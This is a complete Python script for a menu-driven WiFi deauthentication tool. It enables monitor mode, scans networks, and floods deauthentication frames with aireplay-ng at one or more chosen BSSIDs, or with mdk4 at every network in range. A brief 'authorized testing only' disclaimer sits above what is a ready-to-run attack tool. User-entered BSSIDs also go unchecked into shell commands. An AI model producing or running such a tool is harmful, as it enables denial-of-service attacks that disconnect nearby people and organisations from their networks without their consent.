#!/usr/bin/env python3
"""
DISCLAIMER:
This script is for educational purposes and authorized security testing only.
Unauthorized use on networks without explicit permission is illegal.
Use at your own risk.
"""

import os
import sys
import subprocess
import time
import logging
import signal
import shutil

# Install coloredlogs for better console logging output.
import coloredlogs

# Set up logger with coloredlogs (both console and file logging)
logger = logging.getLogger(__name__)
coloredlogs.install(level='INFO', logger=logger)
file_handler = logging.FileHandler('wifi_deauth.log', mode='a')
file_handler.setFormatter(logging.Formatter('%(asctime)s [%(levelname)s] %(message)s'))
logger.addHandler(file_handler)


def clear_screen():
    """Clear the terminal screen."""
    os.system('clear' if os.name == 'posix' else 'cls')


def check_dependencies():
    """Ensure that all required tools are installed."""
    dependencies = ['iw', 'airmon-ng', 'airodump-ng', 'aireplay-ng', 'mdk4']
    missing = []
    for dep in dependencies:
        if shutil.which(dep) is None:
            missing.append(dep)
    if missing:
        logger.error(f"Missing dependencies: {', '.join(missing)}. Please install them and try again.")
        sys.exit(1)
    else:
        logger.info("All system dependencies are present.")


def run_command(cmd):
    """
    Execute a shell command.
    Logs the command and returns the subprocess.CompletedProcess if successful.
    """
    try:
        logger.info(f"Executing: {cmd}")
        result = subprocess.run(cmd, shell=True, check=True)
        return result
    except subprocess.CalledProcessError as e:
        logger.error(f"Command failed: {cmd}\nError: {e}")
        return None


def list_interfaces():
    """
    List available wireless interfaces using the 'iw dev' command.
    Returns a list of interface names.
    """
    try:
        output = subprocess.check_output(["iw", "dev"], stderr=subprocess.DEVNULL).decode("utf-8")
        interfaces = []
        for line in output.splitlines():
            line = line.strip()
            if line.startswith("Interface"):
                parts = line.split()
                if len(parts) >= 2:
                    interfaces.append(parts[1])
        return interfaces
    except Exception as e:
        logger.error(f"Error listing interfaces: {e}")
        sys.exit(1)


def start_monitor_mode(interface):
    """
    Enable monitor mode on the given interface using airmon-ng.
    Assumes that the monitor mode interface is named '<interface>mon'.
    """
    logger.info(f"Starting monitor mode on {interface}...")
    run_command(f"sudo airmon-ng start {interface}")
    # Allow time for mode switch; many systems name it as <interface>mon.
    mon_interface = interface + "mon"
    time.sleep(2)
    logger.info(f"Monitor mode enabled on {mon_interface}.")
    return mon_interface


def stop_monitor_mode(mon_interface):
    """Disable monitor mode on the given monitor interface."""
    logger.info(f"Stopping monitor mode on {mon_interface}...")
    run_command(f"sudo airmon-ng stop {mon_interface}")
    time.sleep(1)
    logger.info("Monitor mode stopped.")


def scan_networks(mon_interface):
    """
    Scan for WiFi networks using airodump-ng.
    The scan continues until interrupted by the user.
    """
    logger.info("Scanning for networks. Press Ctrl+C to stop scanning.")
    try:
        run_command(f"sudo airodump-ng {mon_interface}")
    except KeyboardInterrupt:
        logger.info("Scan interrupted by user.")


def deauth_single(mon_interface, bssid):
    """
    Deauthenticate a single network using aireplay-ng.
    """
    logger.info(f"Starting deauth attack on network {bssid}...")
    run_command(f"sudo aireplay-ng --deauth 0 -a {bssid} {mon_interface}")


def deauth_multiple(mon_interface, bssids):
    """
    Deauthenticate multiple networks concurrently.
    Each deauth attack is started as a background process.
    """
    logger.info("Starting deauth attacks on multiple networks...")
    processes = []
    for bssid in bssids:
        bssid = bssid.strip()
        if bssid:
            logger.info(f"Launching attack on {bssid}...")
            p = subprocess.Popen(f"sudo aireplay-ng --deauth 0 -a {bssid} {mon_interface}", shell=True)
            processes.append(p)
    input("Press Enter to stop all deauth attacks...")
    for p in processes:
        p.terminate()
    logger.info("All deauth attacks terminated.")


def deauth_all(mon_interface):
    """
    Deauthenticate all networks in range using mdk4.
    """
    logger.info("Starting deauth attack on all networks in range using mdk4...")
    try:
        run_command(f"sudo mdk4 {mon_interface} d")
    except KeyboardInterrupt:
        logger.info("Deauth attack interrupted by user.")


def signal_handler(sig, frame, mon_interface):
    """
    Handle termination signals to ensure monitor mode is stopped.
    """
    logger.info("Received termination signal. Cleaning up...")
    stop_monitor_mode(mon_interface)
    sys.exit(0)


def main():
    # Ensure the script is run as root.
    if os.geteuid() != 0:
        logger.error("This script must be run as root. Exiting.")
        sys.exit(1)

    clear_screen()
    check_dependencies()

    # List available wireless interfaces.
    interfaces = list_interfaces()
    if not interfaces:
        logger.error("No wireless interfaces found. Exiting.")
        sys.exit(1)

    logger.info("Available wireless interfaces:")
    for idx, iface in enumerate(interfaces):
        print(f" {idx+1}. {iface}")

    try:
        choice = int(input("Select the interface number to use: ").strip())
        if choice < 1 or choice > len(interfaces):
            logger.error("Invalid selection. Exiting.")
            sys.exit(1)
        selected_interface = interfaces[choice - 1]
    except ValueError as e:
        logger.error(f"Invalid input: {e}. Exiting.")
        sys.exit(1)

    mon_interface = start_monitor_mode(selected_interface)

    # Set up signal handling for graceful termination.
    signal.signal(signal.SIGINT, lambda sig, frame: signal_handler(sig, frame, mon_interface))
    signal.signal(signal.SIGTERM, lambda sig, frame: signal_handler(sig, frame, mon_interface))

    # Main interactive menu loop.
    while True:
        print("\n=== WiFi Deauther Menu ===")
        print("1. Scan for networks")
        print("2. Deauth a single network")
        print("3. Deauth multiple networks")
        print("4. Deauth all networks in range")
        print("5. Exit")
        option = input("Enter your choice: ").strip()

        if option == "1":
            scan_networks(mon_interface)
        elif option == "2":
            bssid = input("Enter target BSSID: ").strip()
            if bssid:
                deauth_single(mon_interface, bssid)
            else:
                logger.error("Invalid BSSID provided.")
        elif option == "3":
            bssids_input = input("Enter comma-separated BSSIDs: ").strip()
            if bssids_input:
                bssids = bssids_input.split(",")
                deauth_multiple(mon_interface, bssids)
            else:
                logger.error("No BSSIDs provided.")
        elif option == "4":
            deauth_all(mon_interface)
        elif option == "5":
            logger.info("Exiting and cleaning up monitor mode...")
            break
        else:
            logger.error("Invalid choice. Please try again.")

    stop_monitor_mode(mon_interface)


if __name__ == '__main__':
    main()
